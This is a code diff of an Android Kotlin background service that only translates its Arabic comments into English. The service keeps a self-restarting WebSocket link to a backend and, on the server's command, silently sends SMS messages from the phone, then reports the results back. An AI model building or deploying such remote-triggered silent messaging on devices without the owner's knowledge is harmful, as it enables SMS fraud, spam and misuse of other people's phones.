@@ -50,12 +50,12 @@ class AssistantBackgroundService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // إعادة تشغيل الخدمة تلقائياً إذا قتلها النظام بسبب الذاكرة
+        // Automatically restart service if terminated by system under memory pressure
         return START_STICKY
     }
 
     /**
-     * تفعيل الـ WakeLock مؤقتاً فقط أثناء تنفيذ المهام الحرجة لتوفير البطارية
+     * Acquire temporary partial wake-lock exclusively during critical task execution to preserve battery life.
      */
     private fun runWithTemporaryWakeLock(timeoutMs: Long = 30000L, block: () -> Unit) {
         val wakeLock = powerManager?.newWakeLock(
@@ -99,7 +99,7 @@ class AssistantBackgroundService : Service() {
 
     private fun connectToBackendBridge() {
         serviceScope.launch {
-            var retryDelay = 2000L // البداية بثانيتين
+            var retryDelay = 2000L // Initial retry delay: 2 seconds
 
             while (isActive) {
                 try {
@@ -114,7 +114,7 @@ class AssistantBackgroundService : Service() {
                         override fun onOpen(webSocket: WebSocket) {
                             Log.i(TAG, "Connected successfully to Jinny Core Telemetry.")
                             currentWebSocket = webSocket
-                            retryDelay = 2000L // تصفير وقت الانتظار عند نجاح الاتصال
+                            retryDelay = 2000L // Reset delay on successful connection
                             webSocket.request(1)
                         }
 
@@ -139,7 +139,7 @@ class AssistantBackgroundService : Service() {
                         .buildAsync(URI.create(wsUrl), wsListener)
                         .get()
 
-                    // حلقة الـ Keepalive Heartbeat كل 25 ثانية
+                    // Keepalive heartbeat ping loop every 25 seconds
                     while (isActive && currentWebSocket != null) {
                         delay(25000L)
                         val ping = JSONObject()
@@ -152,7 +152,7 @@ class AssistantBackgroundService : Service() {
                     Log.w(TAG, "Bridge connection lost ($retryDelay ms): ${e.message}")
                     currentWebSocket = null
                     delay(retryDelay)
-                    // تأخير تصاعدي ذكي (Exponential Backoff) لحد أقصى دقيقة
+                    // Exponential backoff capped at 60 seconds
                     retryDelay = min(retryDelay * 2, 60000L)
                 }
             }
@@ -169,7 +169,7 @@ class AssistantBackgroundService : Service() {
                 val message = json.getString("message")
                 val taskId = json.optString("task_id", "unknown")
 
-                // تنفيذ الإرسال تحت حماية WakeLock مؤقت
+                // Execute dispatch under temporary wake-lock protection
                 runWithTemporaryWakeLock(20000L) {
                     executeSilentSms(phoneNumber, message, taskId)
                 }
@@ -193,12 +193,12 @@ class AssistantBackgroundService : Service() {
             smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null)
 
             Log.i(TAG, "SMS successfully dispatched through cellular modem: $taskId")
-            // إبلاغ السيرفر بنجاح خروج الرسالة من الشريحة
+            // Report successful cellular dispatch to backend
             sendDeliveryReport(taskId, "dispatched", null)
 
         } catch (e: Exception) {
             Log.e(TAG, "Silent SMS transmission failed: $e")
-            // إبلاغ السيرفر بفشل العملية وسبب الفشل
+            // Report transmission failure reason to backend
             sendDeliveryReport(taskId, "failed", e.message)
         }
     }
